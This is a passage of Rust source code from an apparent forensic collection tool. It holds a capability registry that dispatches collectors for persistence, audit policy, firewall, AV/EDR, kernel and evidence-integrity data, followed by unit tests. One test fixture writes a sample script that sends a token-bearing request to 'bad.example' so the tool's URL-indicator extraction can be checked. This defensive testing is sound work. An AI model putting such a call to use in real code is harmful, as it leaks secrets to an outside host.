                        if cfg!(target_os = "windows") =>
                    {
                        jockey_runtime_artifacts::collect_windows_scheduled_tasks()
                    }
                    "persistence.wmi" => {
                        jockey_runtime_artifacts::collect_windows_wmi_subscriptions()
                    }
                    _ => {
                        return Err(format!(
                            "No mechanism-specific persistence collector is implemented for {}",
                            capability.id
                        ))
                    }
                }
                .map_err(|e| e.to_string())?;
                append_records!(records)
            }

            // Security handlers
            "collect_audit_policy" => {
                append_records!(
                    jockey_runtime_security::collect_audit_policy().map_err(|e| e.to_string())?
                )
            }
            "collect_firewall_rules" => {
                append_records!(
                    jockey_runtime_security::collect_firewall_rules().map_err(|e| e.to_string())?
                )
            }
            "detect_av_edr" => {
                append_records!(jockey_runtime_security::detect_av_edr().map_err(|e| e.to_string())?)
            }
            "collect_app_control" => {
                append_records!(
                    jockey_runtime_security::collect_app_control().map_err(|e| e.to_string())?
                )
            }

            // Kernel handlers
            "enumerate_modules" => {
                collector.collect_drivers().map_err(|e| e.to_string())?;
                let records = collector.data().to_vec();
                let count = records.len();
                Ok((CollectionStatus::Success, count, records, None, None))
            }
            "inspect_syscall_table" => {
                append_records!(
                    jockey_runtime_drivers::inspect_syscall_table()
                        .map_err(|e| e.to_string())?
                )
            }
            "collect_boot_config" => {
                append_records!(
                    jockey_runtime_system::collect_boot_config()
                        .map_err(|e| e.to_string())?
                )
            }

            // Evidence handlers
            "build_merkle_tree" => {
                let source_records = options
                    .get("_evidence_records")
                    .and_then(serde_json::Value::as_array)
                    .cloned()
                    .unwrap_or_default();
                let mut evidence = EvidenceCollector::new("capability-evidence-merkle");
                evidence.set_records(source_records.clone());
                let merkle_root = evidence.to_bundle().merkle_root;
                append_records!(vec![serde_json::json!({
                    "merkle_root": merkle_root,
                    "record_count": source_records.len(),
                })])
            }
            "generate_chain_of_custody" => {
                collector.generate_chain_of_custody().map_err(|e| e.to_string())?;
                let records = collector.data().to_vec();
                let count = records.len();
                Ok((CollectionStatus::Success, count, records, None, None))
            }
            "anchor_to_blockchain" => {
                let source_records = options
                    .get("_evidence_records")
                    .and_then(serde_json::Value::as_array)
                    .cloned()
                    .unwrap_or_default();
                let mut evidence = EvidenceCollector::new("capability-evidence-anchor");
                evidence.set_records(source_records.clone());
                let hash = evidence.compute_hash("sha256").map_err(|e| e.to_string())?;
                let anchor = jockey_runtime_evidence::anchor_to_blockchain(&hash)
                    .map_err(|e| e.to_string())?;
                append_records!(vec![serde_json::json!({
                    "evidence_hash": hash,
                    "blockchain_anchor": anchor,
                })])
            }

            _ => Err(format!("Unknown runtime handler: {}", handler)),
        }
    }

    /// Get unimplemented capabilities
    pub fn unimplemented(&self) -> Vec<&Capability> {
        self.capabilities
            .values()
            .filter(|c| !c.is_implemented)
            .collect()
    }

    /// Get total capability count
    pub fn count(&self) -> usize {
        self.capabilities.len()
    }

    /// Get capability count for a specific status
    pub fn count_by_status(&self, status: ImplementationStatus) -> usize {
        self.capabilities
            .values()
            .filter(|c| c.status == status)
            .count()
    }

    /// Get implemented capability count
    pub fn implemented_count(&self) -> usize {
        self.count_by_status(ImplementationStatus::Implemented)
    }

    /// Get partial capability count
    pub fn partial_count(&self) -> usize {
        self.count_by_status(ImplementationStatus::Partial)
    }

    /// Get requires elevation capability count
    pub fn requires_elevation_count(&self) -> usize {
        self.count_by_status(ImplementationStatus::RequiresElevation)
    }

    /// Get platform specific capability count
    pub fn platform_specific_count(&self) -> usize {
        self.count_by_status(ImplementationStatus::PlatformSpecific)
    }

    /// Get unsupported capability count
    pub fn unsupported_count(&self) -> usize {
        self.count_by_status(ImplementationStatus::Unsupported)
    }

    /// Calculate dynamic capability coverage percentage
    pub fn coverage_percentage(&self) -> f64 {
        let total = self.count();
        if total == 0 {
            return 0.0;
        }
        let implemented = self.implemented_count();
        (implemented as f64 / total as f64) * 100.0
    }

    /// Export capability inventory as JSON
    pub fn to_json(&self) -> serde_json::Value {
        let mut map = serde_json::Map::new();
        for cap in self.capabilities.values() {
            map.insert(
                cap.id.as_str().to_string(),
                serde_json::json!({
                    "name": cap.name,
                    "description": cap.description,
                    "category": format!("{:?}", cap.category),
                    "platforms": format!("{:?}", cap.platforms),
                    "privilege": format!("{:?}", cap.privilege),
                    "mitre_attack_ids": cap.mitre_attack_ids,
                    "collector_function": cap.collector_function,
                    "is_implemented": cap.is_implemented,
                    "status": cap.status.to_string(),
                    "status_reason": cap.status_reason,
                    "version": cap.version,
                }),
            );
        }
        serde_json::Value::Object(map)
    }

    /// Export capability inventory as markdown table
    pub fn to_markdown(&self) -> String {
        let mut md = String::new();
        md.push_str("# JOCKEY Capability Inventory\n\n");
        md.push_str(&format!(
            "**Total Capabilities:** {} | **Implemented:** {} | **Partial:** {} | **Requires Elevation:** {} | **Platform Restricted:** {} | **Unsupported:** {} | **Coverage:** {:.1}%\n\n",
            self.count(),
            self.implemented_count(),
            self.partial_count(),
            self.requires_elevation_count(),
            self.platform_specific_count(),
            self.unsupported_count(),
            self.coverage_percentage(),
        ));

        md.push_str(
            "| ID | Name | Category | Platforms | Privilege | Status | MITRE ATT&CK | Implemented |\n",
        );
        md.push_str("|:---|:---|:---|:---|:---|:---|:---|:---:|\n");

        let mut caps: Vec<_> = self.capabilities.values().collect();
        caps.sort_by(|a, b| a.id.as_str().cmp(b.id.as_str()));

        for cap in caps {
            let mitre = if cap.mitre_attack_ids.is_empty() {
                "—".to_string()
            } else {
                cap.mitre_attack_ids.join(", ")
            };
            md.push_str(&format!(
                "| {} | {} | {:?} | {:?} | {:?} | {} | {} | {} |\n",
                cap.id.as_str(),
                cap.name,
                cap.category,
                cap.platforms,
                cap.privilege,
                cap.status,
                mitre,
                if cap.is_implemented { "✓" } else { "✗" }
            ));
        }

        md
    }
}

/// Get the global capability registry instance
pub fn registry() -> &'static CapabilityRegistry {
    static REGISTRY: OnceLock<CapabilityRegistry> = OnceLock::new();
    REGISTRY.get_or_init(CapabilityRegistry::new)
}

/// Initialize the registry (forces eager initialization)
pub fn init_registry() -> &'static CapabilityRegistry {
    registry()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_registry_initialization() {
        let reg = registry();
        assert!(reg.count() > 0, "Registry should have capabilities");
    }

    #[test]
    fn test_implemented_count() {
        let reg = registry();
        let implemented = reg.implemented_count();
        let total = reg.count();
        let unimpl = reg.unimplemented();
        println!("Total: {}, Implemented: {}, Unimplemented: {}", total, implemented, unimpl.len());
        println!("------------------------------------------------------------");
        let mut sorted_unimpl: Vec<_> = unimpl.iter().collect();
        sorted_unimpl.sort_by_key(|c| &c.id);
        for cap in sorted_unimpl {
            println!(
                "{:<35} | {:<20?} | {:<8?} | {:<6?} | {}",
                cap.id, cap.category, cap.platforms, cap.privilege, cap.collector_function
            );
        }
        println!("------------------------------------------------------------");
        assert!(
            implemented > 0,
            "Should have at least some implemented capabilities"
        );
    }

    #[test]
    fn test_phase_1_capability_inventory_floor() {
        let reg = registry();
        assert!(
            reg.count() >= 200,
            "Phase 1 registry must include at least 200 capabilities"
        );
        assert!(
            reg.implemented_count() >= 200,
            "Phase 1 must have at least 200 implemented capabilities"
        );
    }

    #[test]
    fn test_capability_by_id() {
        let reg = registry();
        let cap = reg.get("system.info.basic");
        assert!(cap.is_some());
        assert_eq!(cap.unwrap().id.as_str(), "system.info.basic");
    }

    #[test]
    fn test_capability_by_category() {
        let reg = registry();
        let system_caps = reg.by_category(CapabilityCategory::SystemInfo);
        assert!(!system_caps.is_empty());
        for cap in system_caps {
            assert_eq!(cap.category, CapabilityCategory::SystemInfo);
        }
    }

    #[test]
    fn test_capability_by_platform() {
        let reg = registry();
        let linux_caps = reg.by_platform(Platform::Linux);
        let windows_caps = reg.by_platform(Platform::Windows);
        let both_caps = reg.by_platform(Platform::Both);

        println!(
            "Linux-only: {}, Windows-only: {}, Both: {}",
            linux_caps.len(),
            windows_caps.len(),
            both_caps.len()
        );

        assert!(!linux_caps.is_empty());
        assert!(!windows_caps.is_empty());
        assert!(!both_caps.is_empty());
    }

    #[test]
    fn test_json_export() {
        let reg = registry();
        let json = reg.to_json();
        assert!(json.is_object());
        let obj = json.as_object().unwrap();
        assert!(obj.contains_key("system.info.basic"));
    }

    #[test]
    fn test_markdown_export() {
        let reg = registry();
        let md = reg.to_markdown();
        assert!(md.contains("Capability Inventory"));
        assert!(md.contains("system.info.basic"));
        println!("{}", md);
    }

    #[test]
    fn test_runtime_contracts_for_known_impls() {
        let reg = registry();

        assert!(reg.runtime_capability_exists("system.info.detailed"));
        assert!(reg.runtime_capability_exists("user.enumerate"));
        assert!(reg.runtime_capability_exists("auth.logon_events"));
        assert!(reg.runtime_capability_exists("auth.credential_artifacts"));
        assert!(reg.runtime_capability_exists("auth.policy"));
        assert!(reg.runtime_capability_exists("service.enumerate"));
        assert!(reg.runtime_capability_exists("service.systemd"));

        let result = reg.invoke_runtime_capability("system.info.basic");
        assert!(
            result.is_ok(),
            "system.info.basic should resolve to a runtime-backed collector"
        );
        let payload = result.unwrap();
        assert_eq!(payload.status, CollectionStatus::Success);
        assert_eq!(payload.runtime_module, "jockey_runtime_system");
        assert!(payload.records_count > 0);
        let provenance = payload.evidence_records[0]
            .get("_provenance")
            .expect("collected evidence must carry provenance");
        assert_eq!(provenance["capability_id"], "system.info.basic");
        assert_eq!(provenance["collector"], "collect_system_info");
        assert!(!provenance["host"].as_str().unwrap_or_default().is_empty());
        if cfg!(target_os = "windows") {
            assert_eq!(provenance["platform"], "Windows");
        } else {
            assert_eq!(provenance["platform"], "Linux");
        }
        assert_eq!(provenance["status"], "SUCCESS");
        assert_eq!(provenance["origin"], "REAL");
    }

    #[test]
    fn test_capability_result_status_constructors() {
        let make_result = |status: fn(
            String,
            String,
            String,
            String,
            String,
            String,
            String,
            u64,
        ) -> CapabilityExecutionResult| {
            status(
                "cap.test".into(),
                "Test".into(),
                "handler".into(),
                "module".into(),
                "Linux".into(),
                "User".into(),
                "record".into(),
                1,
            )
        };

        assert_eq!(
            make_result(CapabilityExecutionResult::not_found).status,
            CollectionStatus::NotFound
        );
        assert_eq!(
            make_result(CapabilityExecutionResult::unsupported).status,
            CollectionStatus::Unsupported
        );
        assert_eq!(
            make_result(CapabilityExecutionResult::permission_denied).status,
            CollectionStatus::PermissionDenied
        );
        assert_eq!(
            CapabilityExecutionResult::failed(
                "cap.test".into(),
                "Test".into(),
                "handler".into(),
                "module".into(),
                "Linux".into(),
                "User".into(),
                "record".into(),
                "failure".into(),
                1,
            )
            .status,
            CollectionStatus::Failed,
        );
        assert_eq!(
            serde_json::to_value(CollectionStatus::PermissionDenied).unwrap(),
            "PERMISSION_DENIED",
        );
    }

    #[test]
    fn test_authoritative_runtime_dispatch_map() {
        let reg = registry();

        let binding = reg
            .runtime_binding_for("user.enumerate")
            .expect("user.enumerate should resolve through the authoritative map");
        assert_eq!(binding.runtime_module, "jockey_runtime_users");
        assert_eq!(binding.runtime_handler, "enumerate_users");
        assert_eq!(
            reg.capability_truth_status("user.enumerate"),
            CapabilityTruthStatus::RuntimeBound
        );
        assert_eq!(
            reg.capability_truth_status("persistence.wmi"),
            CapabilityTruthStatus::RuntimeBound
        );
        assert!(reg.runtime_capability_exists("persistence.wmi"));
    }

    #[test]
    fn test_runtime_dispatch_resolves_declared_capability_aliases() {
        let reg = registry();
        // Test a subset of fast capabilities to avoid slow filesystem enumeration
        let ids = [
            "user.list",
            "user.sid",
            "auth.logon.events",
            "service.systemd.units",
            "process.pid",
            "network.interfaces",
            "security.audit.policy",
        ];

        for id in ids {
            assert!(
                reg.runtime_binding_for(id).is_some(),
                "{} should resolve via the runtime dispatch alias map",
                id
            );
            let result = reg.invoke_runtime_capability(id);
            assert!(
                result.is_ok(),
                "{} should invoke successfully through its runtime binding: {:?}",
                id,
                result.err()
            );
            let payload = result.unwrap();
            // Check that the execution produced some result (success, partial, or failed with proper error)
            assert!(matches!(
                payload.status,
                CollectionStatus::Success
                    | CollectionStatus::Partial
                    | CollectionStatus::Failed
                    | CollectionStatus::NotFound
                    | CollectionStatus::Unsupported
                    | CollectionStatus::PermissionDenied
            ));
            assert!(!payload.handler.is_empty());
            assert!(!payload.runtime_module.is_empty());
        }
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn test_elf_capability_invokes_parser_with_source_path() {
        let registry = registry();
        let executable = std::env::current_exe().unwrap();
        let mut options = serde_json::Map::new();
        options.insert("path".to_string(), serde_json::json!(executable));

        let result = registry
            .invoke_runtime_capability_with_options("file.elf.metadata", &options)
            .unwrap();
        assert_eq!(result.status, CollectionStatus::Success);
        assert_eq!(result.runtime_module, "jockey_runtime_artifacts");
        assert_eq!(result.records_count, 1);
        assert_eq!(result.evidence_records[0]["metadata"]["file_type"], "elf");
        assert_eq!(
            result.evidence_records[0]["_provenance"]["capability_id"],
            "file.elf.metadata"
        );
    }

    #[test]
    fn test_file_hash_capability_hashes_source_bytes() {
        let path = std::env::temp_dir().join(format!("jockey-hash-{}.bin", std::process::id()));
        std::fs::write(&path, b"forensic source bytes").unwrap();
        let mut options = serde_json::Map::new();
        options.insert("path".to_string(), serde_json::json!(path));

        let result = registry()
            .invoke_runtime_capability_with_options("file.hash.sha256", &options)
            .unwrap();
        let expected =
            jockey_runtime_filesystem::calculate_hash(options["path"].as_str().unwrap(), "sha256")
                .unwrap();
        let _ = std::fs::remove_file(options["path"].as_str().unwrap());

        assert_eq!(result.status, CollectionStatus::Success);
        assert_eq!(result.evidence_records[0]["sha256"], expected);
    }

    #[test]
    fn test_evidence_hash_and_merkle_use_supplied_records() {
        let records = serde_json::json!([{"record": "one"}, {"record": "two"}]);
        let mut options = serde_json::Map::new();
        options.insert("_evidence_records".to_string(), records.clone());

        let hash_result = registry()
            .invoke_runtime_capability_with_options("evidence.sha256", &options)
            .unwrap();
        let mut evidence = EvidenceCollector::new("expected-hash");
        evidence.set_records(records.as_array().unwrap().clone());
        let expected_hash = evidence.compute_hash("sha256").unwrap();
        assert_eq!(hash_result.status, CollectionStatus::Success);
        assert_eq!(
            hash_result.evidence_records[0]["evidence_sha256"],
            expected_hash
        );

        let merkle_result = registry()
            .invoke_runtime_capability_with_options("evidence.merkle", &options)
            .unwrap();
        assert_eq!(merkle_result.status, CollectionStatus::Success);
        assert_eq!(merkle_result.evidence_records[0]["record_count"], 2);
        assert_eq!(
            merkle_result.evidence_records[0]["merkle_root"]
                .as_str()
                .unwrap()
                .len(),
            64
        );
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn test_persistence_capabilities_keep_mechanism_specific_records() {
        let shell_profiles = registry()
            .invoke_runtime_capability("persistence.shell.profile")
            .unwrap();
        let startup_folder = registry()
            .invoke_runtime_capability("persistence.startup.folder")
            .unwrap();

        assert_eq!(shell_profiles.status, CollectionStatus::Success);
        assert_eq!(startup_folder.status, CollectionStatus::Success);
        assert!(shell_profiles.evidence_records.iter().any(|record| {
            record
                .get("artifact_type")
                .and_then(serde_json::Value::as_str)
                == Some("shell_profile")
                || record.get("status").and_then(serde_json::Value::as_str)
                    == Some("no_artifacts_found")
        }));
        assert!(startup_folder.evidence_records.iter().any(|record| {
            record
                .get("artifact_type")
                .and_then(serde_json::Value::as_str)
                == Some("xdg_autostart")
                || record.get("status").and_then(serde_json::Value::as_str)
                    == Some("no_artifacts_found")
        }));
    }

    #[test]
    fn test_script_url_capability_returns_url_projection() {
        let root = std::env::temp_dir().join(format!("jockey-script-url-{}", std::process::id()));
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(
            root.join("sample.py"),
            "import requests\nrequests.get('https://bad.example/path?token=hidden')\n",
        )
        .unwrap();
        let mut options = serde_json::Map::new();
        options.insert("path".to_string(), serde_json::json!(root));

        let result = registry()
            .invoke_runtime_capability_with_options("script.url.indicators", &options)
            .unwrap();
        let _ = std::fs::remove_dir_all(options["path"].as_str().unwrap());

        assert_eq!(result.status, CollectionStatus::Success);
        assert_eq!(result.records_count, 1);
        assert_eq!(
            result.evidence_records[0]["indicator_type"],
            "script.url.indicators"
        );
        assert_eq!(
            result.evidence_records[0]["indicators"][0],
            "https://bad.example/path"
        );
        assert!(!result.evidence_records[0]
            .to_string()
            .contains("token=hidden"));
    }
}
